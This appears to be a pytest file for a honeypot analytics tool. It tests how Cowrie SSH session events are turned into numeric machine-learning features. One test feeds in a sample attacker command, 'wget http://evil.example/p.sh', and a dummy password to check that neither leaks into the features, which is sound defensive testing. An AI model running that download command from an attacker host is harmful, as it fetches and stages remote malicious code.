from datetime import datetime, timedelta, timezone

from src.ml.features import FEATURE_NAMES, build_session_features
from src.normalization.normalize import normalize_event

T0 = datetime(2026, 11, 8, 10, 0, 0, tzinfo=timezone.utc)


def ev(event_id, kind, seconds=0, session="s1", source="cowrie", **extra):
    event = {
        "event_id": event_id,
        "source": source,
        "event_type": kind,
        "session_id": session,
        "src_ip": "10.0.0.5",
        "event_timestamp": T0 + timedelta(seconds=seconds),
    }
    event.update(extra)
    return event


def one_session():
    return [
        ev("e0", "cowrie.session.connect", 0),
        ev("e1", "cowrie.login.failed", 5, username="root"),
        ev("e2", "cowrie.login.failed", 10, username="admin"),
        ev("e3", "cowrie.login.failed", 15, username="root"),
        ev("e4", "cowrie.login.success", 20, username="root"),
        ev("e5", "cowrie.command.input", 25),
        ev("e6", "cowrie.command.input", 30),
    ]


def test_counts():
    f = build_session_features(one_session())[0].values
    assert f["event_count"] == 7
    assert f["login_failed_count"] == 3
    assert f["login_success_count"] == 1
    assert f["command_count"] == 2
    assert f["distinct_event_types"] == 4
    assert f["distinct_usernames"] == 2


def test_duration_and_rate():
    f = build_session_features(one_session())[0].values
    assert f["duration_seconds"] == 30
    assert abs(f["events_per_second"] - 7 / 30) < 1e-9


def test_single_event_session_has_zero_duration_and_finite_rate():
    f = build_session_features([ev("e0", "cowrie.session.connect")])[0].values
    assert f["duration_seconds"] == 0
    assert f["events_per_second"] == 1.0


def test_failed_login_ratio():
    f = build_session_features(one_session())[0].values
    assert f["failed_login_ratio"] == 0.75
    no_login = build_session_features([ev("e0", "cowrie.session.connect")])[0].values
    assert no_login["failed_login_ratio"] == 0.0


def test_events_without_session_are_ignored():
    assert build_session_features([ev("e0", "cowrie.login.failed", session=None)]) == []


def test_same_ip_different_sessions_stay_separate():
    events = [ev("a", "cowrie.login.failed", session="A"),
              ev("b", "cowrie.login.failed", session="B")]
    result = build_session_features(events)
    assert [r.session_id for r in result] == ["A", "B"]
    assert all(r.values["event_count"] == 1 for r in result)


def test_same_session_id_from_different_sources_stays_separate():
    events = [ev("a", "cowrie.login.failed", source="cowrie"),
              ev("b", "cowrie.login.failed", source="other")]
    assert len(build_session_features(events)) == 2


def test_duplicate_events_count_once():
    events = [ev("a", "cowrie.login.failed"), ev("a", "cowrie.login.failed")]
    assert build_session_features(events)[0].values["event_count"] == 1


def test_invalid_and_naive_events_are_skipped():
    events = [
        ev("ok", "cowrie.login.failed"),
        ev("naive", "cowrie.login.failed", event_timestamp=datetime(2026, 11, 8, 10, 0, 1)),
        ev("no-ts", "cowrie.login.failed", event_timestamp=None),
        {"event_type": "x", "session_id": "s1", "event_timestamp": T0},
        None,
        "text",
    ]
    result = build_session_features(events)
    assert len(result) == 1
    assert result[0].values["event_count"] == 1


def test_result_does_not_depend_on_input_order():
    events = one_session()
    assert build_session_features(events) == build_session_features(list(reversed(events)))


def test_vector_is_numeric_and_ordered():
    features = build_session_features(one_session())[0]
    vector = features.vector()
    assert len(vector) == len(FEATURE_NAMES)
    assert all(isinstance(x, float) for x in vector)
    assert vector[0] == 7.0  # event_count est la première feature


def test_features_contain_no_text_or_secret():
    raws = [
        {"eventid": "cowrie.login.failed", "timestamp": "2026-10-28T10:00:00Z",
         "session": "real-1", "src_ip": "10.0.0.9", "username": "root",
         "password": "example-secret"},
        {"eventid": "cowrie.command.input", "timestamp": "2026-10-28T10:00:05Z",
         "session": "real-1", "src_ip": "10.0.0.9",
         "input": "wget http://evil.example/p.sh"},
    ]
    result = build_session_features([normalize_event(r) for r in raws])
    assert len(result) == 1
    assert "example-secret" not in str(result)
    assert "evil.example" not in str(result)
    assert "10.0.0.9" not in str(result)
    assert all(isinstance(v, (int, float)) for v in result[0].values.values())


def test_empty_input():
    assert build_session_features([]) == []


def test_feature_names_match_computed_values():
    values = build_session_features(one_session())[0].values
    assert set(values) == set(FEATURE_NAMES)